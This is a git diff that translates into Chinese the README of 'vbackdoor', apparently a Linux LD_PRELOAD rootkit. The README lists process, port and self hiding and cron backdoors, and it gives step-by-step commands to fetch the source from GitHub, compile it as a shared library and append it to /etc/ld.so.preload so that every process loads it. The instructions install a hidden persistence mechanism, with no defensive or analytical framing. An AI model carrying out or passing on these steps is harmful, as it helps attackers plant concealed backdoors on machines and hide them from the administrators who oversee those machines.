@@ -1,7 +1,7 @@
 # vbackdoor
-Hide a process,port,self under Linux using the linux LD_PRELOAD rootkit.
+使用 LD_PRELOAD rootkit 技术进行隐藏进程、隐藏端口、后门添加、自我隐藏
 
-### compile the library
+### 编译（使用时修改vbackdoor.c内容）
 
 ```
 git clone https://github.com/veo/vbackdoor.git
@@ -11,7 +11,7 @@ make
 sudo mv vbackdoor.so /usr/local/lib/
 ```
 
-or
+或者
 
 ```
 wget https://raw.githubusercontent.com/veo/vbackdoor/main/vbackdoor.c
@@ -20,7 +20,7 @@ gcc -Wall -fPIC -shared -o vbackdoor.so vbackdoor.c -ldl
 sudo mv vbackdoor.so /usr/local/lib/
 ```
 
-### Load it with the global dynamic linker
+### 载入后门
 
 ```
 echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
@@ -29,7 +29,7 @@ echo /usr/local/lib/vbackdoor.so >> /etc/ld.so.preload
 
 
 
-  * Process hiding
-  * LD_PRELOAD hiding
-  * Network hiding
-  * cron Backdoors
+  * 进程隐藏
+  * LD_PRELOAD 隐藏
+  * 端口隐藏
+  * 计时任务后门
